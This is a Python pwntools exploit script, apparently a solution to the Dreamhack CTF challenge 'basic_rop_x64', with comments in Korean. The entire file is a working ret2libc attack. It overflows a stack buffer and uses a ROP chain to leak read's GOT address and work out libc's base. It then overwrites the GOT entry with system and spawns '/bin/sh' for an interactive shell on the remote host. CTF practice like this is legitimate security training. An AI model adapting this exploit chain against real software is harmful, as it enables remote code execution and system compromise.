from pwn import *

#logging function
def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

context.log_level='debug'
context.arch='amd64'

p=remote('host3.dreamhack.games',22728)
#p=process('./basic_rop_x64') for local
e=ELF('./basic_rop_x64')
libc=ELF('./libc.so.6')
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # for local ubuntu 20.04 lts
# address
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
put_plt = e.plt['puts']
put_got = e.got['puts']

# ROP gadget
# rdi, rsi, r15 have to be set for read,write functions 
ppr = 0x0000000000400881 # pop rsi; pop r15; ret;
pr = 0x0000000000400883 # pop rdi; ret;
ret = 0x00000000004005a9 # ret;

payload=b'a'*0x48 # dummying buffer and sfp

#read_got 출력
#write(1,read_got,0x8)
payload+=p64(pr)
payload+=p64(1)
payload+=p64(ppr)
payload+=p64(read_got)
payload+=p64(8)
payload+=p64(write_plt)

#read_got 주소를 system주소로 GOT overwrite 
#read_got+0x8 주소에는 '/bin/sh' 문자열 삽입
#read(0,read_got,0x10)
payload+=p64(pr)
payload+=p64(0)
payload+=p64(ppr)
payload+=p64(read_got)
payload+=p64(16)
payload+=p64(read_plt)

#system 함수 호출 
payload+=p64(pr)
payload+=p64(read_got+0x8)
payload+=p64(ret)
payload+=p64(read_plt)

p.send(payload)
p.recvuntil(b'a'*0x40)
read = u64(p.recvn(6) + b'\x00'*2) 
lb = read-libc.symbols['read']
system = lb + libc.symbols['system']

slog("read :",read)
slog("library",lb)
slog("system", system)

p.send(p64(system)+b'/bin/sh\x00')

p.interactive()
